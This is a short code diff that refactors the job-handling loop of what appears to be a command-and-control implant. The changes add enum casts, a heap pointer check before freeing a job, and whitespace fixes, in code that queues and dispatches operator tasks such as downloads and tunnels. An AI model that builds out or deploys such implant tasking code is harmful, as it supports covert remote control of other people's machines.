@@ -89,7 +89,8 @@ auto DECLFN Jobs::Send(
             Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );
 
             Current->State = KH_JOB_TERMINATE;
-            if( ! Current->Clean ){
+            
+            if( ! Current->Clean ) {
                 Current->State = KH_JOB_RUNNING;
                 Self->Pkg->Destroy( Current->Pkg );
                 Current->Pkg = Self->Pkg->Create( Current->CmdID, Current->UUID );
@@ -118,7 +119,7 @@ auto DECLFN Jobs::Send(
             Self->Pkg->Int32( PostJobs, PkgLen );
 
             Self->Pkg->Bytes( PostJobs, UC_PTR( Current->UUID ), 36 );
-            Self->Pkg->Int16( PostJobs, Enm::Task::Error );
+            Self->Pkg->Int16( PostJobs, (INT16)Action::Task::Error );
             Self->Pkg->Int32( PostJobs, Current->ExitCode );
 
             if ( MsgLen > 0 && ErrorMsg ) {
@@ -167,7 +168,9 @@ auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
                 Self->Psr->Destroy( ToRemove->Psr );
             }
 
-            hFree( ToRemove );
+            if ( Self->Hp->CheckPtr( ToRemove ) ) {
+                hFree( ToRemove );
+            }
             
             Count--;
         } else {
@@ -183,12 +186,13 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> LONG {
 
     while ( Current ) {
         if ( Current->State == KH_JOB_PRE_START || Current->State == KH_JOB_RUNNING ) {
-            if(!Current->PersistTriggered && (Current->CmdID == Enm::Task::ProcessDownloads || Current->CmdID == Enm::Task::ProcessTunnels )){
+            if( ! Current->PersistTriggered && ((Action::Task)Current->CmdID == Action::Task::ProcessDownloads || (Action::Task)Current->CmdID == Action::Task::ProcessTunnels ) ){
                 KhDbg("Persist Triggered for job: %s", Current->UUID);
                 Current->PersistTriggered = TRUE;
                 Current = Current->Next;
                 continue;
             }
+            
             KhDbg( "executing task UUID : %s", Current->UUID );
             KhDbg( "executing command id: %d", Current->CmdID );
 
@@ -219,7 +223,7 @@ auto DECLFN Jobs::Execute(
     G_KHARON
 
     for ( INT i = 0; i < TSK_LENGTH; i++ ) {
-        if ( Job->CmdID == Self->Tsk->Mgmt[i].ID ) {
+        if ( (Action::Task)Job->CmdID == Self->Tsk->Mgmt[i].ID ) {
             return ( Self->Tsk->*Self->Tsk->Mgmt[i].Run )( Job );
         }
     }
